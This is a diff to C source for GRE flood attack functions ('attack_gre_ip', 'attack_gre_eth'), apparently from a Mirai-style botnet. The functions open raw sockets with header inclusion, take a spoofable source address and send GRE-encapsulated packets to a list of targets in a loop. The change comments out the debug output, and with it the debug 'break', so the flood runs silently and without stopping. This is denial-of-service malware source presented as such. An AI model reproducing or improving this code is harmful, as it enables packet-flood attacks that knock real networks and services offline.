@@ -33,18 +33,18 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -150,12 +150,12 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
             targs[i].sock_addr.sin_port = 0;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
-
+/*
 #ifdef DEBUG
         if (errno != 0)
             printf("errno = %d\n", errno);
         break;
-#endif
+#endif*/
     }
 }
 
@@ -175,18 +175,18 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
-#endif
+#endif*/
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+#endif*/
         close(fd);
         return;
     }
@@ -308,11 +308,11 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             targs[i].sock_addr.sin_port = 0;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
-
+/*
 #ifdef DEBUG
         if (errno != 0)
             printf("errno = %d\n", errno);
         break;
-#endif
+#endif*/
     }
 }
